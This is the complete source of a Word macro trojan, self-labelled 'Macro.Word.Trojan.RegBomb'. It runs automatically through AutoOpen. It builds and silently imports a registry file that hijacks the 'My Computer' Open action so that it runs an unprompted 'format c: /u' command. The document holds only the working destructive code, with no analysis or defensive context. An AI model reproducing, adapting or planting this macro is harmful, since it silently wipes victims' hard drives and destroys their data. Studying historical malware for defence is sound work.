   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim title$
   Dim copyright$
   title$ = "c:\regbomb.reg"
   copyright$ = "Macro.Word.Trojan.RegBomb (c) by Duke/SMF"
   WordBasic.FileNew
   WordBasic.Insert "REGEDIT4" + Chr(13) + Chr(10)
   WordBasic.Insert "" + Chr(13) + Chr(10)
   WordBasic.Insert "[HKEY_LOCAL_MACHINE" + Chr(92) + _
   "SOFTWARE\Classes\CLSID\{20D04FE0" + _
   "-3AEA-1069-A2D8-08002B30309D}\shell\Open]" + Chr(13) + Chr(10)
   WordBasic.Insert "" + Chr(13) + Chr(10)
   WordBasic.Insert "[HKEY_LOCAL_MACHINE" + Chr(92) + _
   "SOFTWARE\Classes\CLSID\{20D04FE0-3AEA" + _
   "-1069-A2D8-08002B30309D}\shell\Open\Command]" + Chr(13) + Chr(10)
   WordBasic.Insert "@=" + Chr(34) + "start /minimized command /c echo y" + _
   "|format c: /u >nul" + Chr(34) + Chr(13) + Chr(10)
   WordBasic.Insert ""
   WordBasic.FileSaveAs Name:=title$, Format:=4
   WordBasic.FileClose (2)
   WordBasic.Shell Environ("WINDIR") + "\regedit.exe " + title$, 0
   End Sub
